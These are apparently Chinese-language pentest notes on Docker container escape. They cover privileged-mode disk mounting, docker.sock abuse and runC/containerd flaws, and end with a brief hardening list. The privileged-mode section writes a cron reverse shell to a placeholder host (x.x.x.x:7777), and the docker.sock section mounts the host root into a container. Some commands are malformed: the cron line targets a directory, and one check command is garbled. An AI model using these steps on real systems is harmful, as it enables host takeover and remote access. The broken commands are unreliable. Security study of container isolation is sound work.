# 容器逃逸

一个容器可以访问外面的资源，甚至获取宿主机的控制

- 内核导致
    - `docker` 运行共享宿主机内核，内核存在安全漏洞时可能发生逃逸
        - 内存页写时复制的机制
- 序漏洞逃逸
    - `runC`
        - 重写二进制文件，可以在宿主机上以 `root` 身份执行命令
    - `containerd`
        - 控制 `runC` 的守护进程，当容器使用 `-net=host` 参数启动且与宿主机共享 `net namespace` 会暴露 `containerd-shim`
          监听的 `Unix` 套接字，攻击者直接操作套接字
- 特权模式加挂载
    - 磁盘挂载
        - 特权模式运行容器的 `root` 拥有外部 `root` 权限
        - 特权模式可以对整个宿主机读写，挂载外部磁盘，通过计划任务等方式操作宿主机
    - 容器挂载
        - `/var/run/docker.sock` 文件挂载到容器中

### 特权模式

```bash
docker run --name debian-1 -d --privileged=true debian tail -f /dev/null
docker exec -it debian-1 /bin/bash
cat /proc/self/status | grep Cap # 查看是否开启特权模式
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff  # 特权模式
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000

fdisk -l
mount /dev/sda1 /home/test
echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/7777 0>&1'>> /home/test
```

### 容器挂载

```bash
docker run --name debian-1 -d --privileged=true -v /var/run/docker.sock:/var/run/docker.sock debian tail -f /dev/null
find / -name docker.sock
# 安装客户端
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
# 挂载根目录
docker run -it -v /:/host rabbitmq:3-management-alpine bash
```

### 容器渗透命令

- 查看回显结果是否有 docker
  - `cat /proc/1/cgroup`
  - `ls /.dockerenv`
- 查看环境变量
- `capability grep CapEff /proc/self/status `
- `find / -name docker.sock`

### 防止渗透

- 高版本 `docker`
- 高版本 `runc`
- 高版本内核
- 不用 `root` 运行 `docker` 服务
- 不用 `privileged` 启动容器
- 不建议用 `—cap-add=SYSADMIN` 启动容器